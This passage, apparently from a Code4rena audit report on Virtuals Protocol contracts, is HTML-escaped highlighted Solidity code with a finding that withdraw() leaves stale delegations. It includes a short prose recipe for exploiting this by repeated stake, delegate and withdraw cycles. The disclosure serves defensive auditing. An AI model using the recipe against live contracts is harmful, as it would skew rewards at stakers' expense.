\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;      \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, the \u003ccode\u003ewithdraw()\u003c/code\u003e function does not call \u003ccode\u003e_delegate(sender, address(0))\u003c/code\u003e to clean up delegations when a user fully withdraws their stake. This leaves the previous delegation entry active, even though the staker now has zero voting power.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewithdraw\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; ((\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematureAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not mature yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_burn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOnce maturity is reached, a malicious user can exploit this flaw by:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe user stakes tokens and delegates.\u003c/li\u003e\n\u003cli\u003eThen immediately withdraws them when maturity.\u003c/li\u003e\n\u003cli\u003eRepeats the cycle multiple times, possibly in the same block.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEach cycle leaves delegation entries intact while reducing the actual staked balance to zero.\u003c/p\u003e\n\u003cp\u003eThe system uses \u003ccode\u003egetPastDelegates()\u003c/code\u003e in reward logic to compute historical rewards based on:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L204\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L204\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetClaimableStakerRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalClaimable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eClaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_stakerClaims\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLOOP_LIMIT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAgentRewardCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAgentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAgentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastDelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euptime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakedAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastBalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakedAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan 